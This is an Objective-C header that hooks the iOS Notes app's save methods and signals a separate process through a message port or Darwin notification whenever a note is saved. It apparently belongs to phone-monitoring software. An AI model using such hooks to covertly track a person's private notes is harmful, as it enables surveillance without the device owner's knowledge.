//
//  Note.h
//  MSFSP
//
//  Created by Makara Khloth on 12/21/12.
//  Copyright 2012 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <CoreFoundation/CoreFoundation.h>

#import "NotesDisplayController.h"

// iOS 9
#import "ICNoteContext.h"

#import "MessagePortIPCSender.h"
#import "DefStd.h"

HOOK(NotesDisplayController, saveNote, void) {
	DLog(@"!!!!!!!!!! saveNote is called...");
	CALL_ORIG(NotesDisplayController, saveNote);	
	
	MessagePortIPCSender *s = [[MessagePortIPCSender alloc] initWithPortName:kNoteACMessagePort];
	[s writeDataToPort:[NSData data]];
	[s release];
}

#pragma mark - iOS 9 -

HOOK(ICNoteContext, save_iPadiPod$, BOOL, id *arg1) {
    DLog (@"============================ >>>>> save$");
    
    MessagePortIPCSender *s = [[MessagePortIPCSender alloc] initWithPortName:kNoteACMessagePort];
    [s writeDataToPort:[NSData data]];
    [s release];
    
    return CALL_ORIG(ICNoteContext, save_iPadiPod$, arg1);
}

HOOK(ICNoteContext, save$, BOOL, id *arg1) {
    DLog (@"============================ >>>>> save$");
    CFNotificationCenterPostNotification(CFNotificationCenterGetDarwinNotifyCenter(),
                                         CFSTR("NoteContextChangedElsewhereNotification"),
                                         (__bridge const void *)(self),
                                         nil,
                                         TRUE);
    
    return CALL_ORIG(ICNoteContext, save$, arg1);
}
